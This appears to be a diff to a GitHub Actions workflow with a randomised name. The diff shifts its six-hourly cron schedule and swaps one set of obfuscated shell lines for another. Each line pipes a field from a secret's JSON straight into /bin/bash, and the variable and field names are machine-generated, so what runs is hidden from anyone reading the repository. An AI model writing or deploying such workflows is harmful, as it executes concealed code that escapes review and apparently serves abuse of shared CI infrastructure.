@@ -2,9 +2,9 @@ name: jinchangfa7145
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 0/6 * * *'
+    - cron: '43 3/6 * * *'
 
-jobs:  # 3537
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +12,22 @@ jobs:  # 3537
       - uses: actions/checkout@v4
       - name: jinchangfa7145
         env:
-          d7: ${{ secrets.d7 }}
+          jr39: ${{ secrets.jr39 }}
         run: |
-          echo $d7 | jq -r .v186 | /bin/bash
-          echo $nphj77305 | jq -r .m4 | /bin/bash
-          echo $svjn309 | jq -r .ls869 | /bin/bash
-          echo $wizn76385 | jq -r .fefl545 | /bin/bash
-          echo $jj69 | jq -r .h9067 | /bin/bash
-          echo $whw808 | jq -r .j743 | /bin/bash
-          echo $z82830 | jq -r .gwnn79 | /bin/bash
+          echo $jr39 | jq -r .g86485 | /bin/bash
+          echo $velny0 | jq -r .krm61 | /bin/bash
+          echo $prc9059 | jq -r .evfk53 | /bin/bash
+          echo $ko4 | jq -r .pqcxi99 | /bin/bash
+          echo $n7609 | jq -r .b726 | /bin/bash
+          echo $idyuq8 | jq -r .oixi7 | /bin/bash
+          echo $lzi93 | jq -r .jqu902 | /bin/bash
+          echo $fjav95656 | jq -r .dvu96610 | /bin/bash
+          echo $rpkm8514 | jq -r .dek08106 | /bin/bash
+          echo $vq981 | jq -r .qy96 | /bin/bash
+          echo $whpp09623 | jq -r .jqhqt44079 | /bin/bash
+          echo $i9677 | jq -r .jlv56428 | /bin/bash
+          echo $cb6982 | jq -r .wtv96 | /bin/bash
+          echo $ib8529 | jq -r .sl0 | /bin/bash
+          echo $ofry1190 | jq -r .zgbl1 | /bin/bash
+          echo $vl8 | jq -r .uvz8124 | /bin/bash
 
